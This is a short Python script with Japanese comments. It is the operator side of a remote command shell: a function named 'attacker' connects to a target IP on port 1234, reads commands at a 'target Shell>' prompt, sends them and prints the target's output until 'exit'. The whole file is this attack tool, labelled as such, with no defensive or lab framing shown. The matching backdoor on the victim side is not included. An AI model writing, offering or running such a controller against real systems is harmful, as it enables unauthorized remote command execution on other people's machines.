import socket

def attacker(target_ip):
    # 通信先サーバー
    server_host = target_ip
    server_port = 1234
    
    
    # サーバーに接続
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_host, server_port))
    
    print("[+] OK! connecting...")
    
    while True:
        print("[+] waiting command...")
        
        # メッセージ送信
        command = input("target Shell>")
        client_socket.send(command.encode("utf-8"))
        
        # 終了コマンド
        if command.lower() == "exit":
            print("Disconnect!")
            break
        
        # サーバーからのレスポンス受信
        responce = client_socket.recv(4096).decode("utf-8")
        print('[+] Server response:', responce)
        
    # close
    client_socket.close()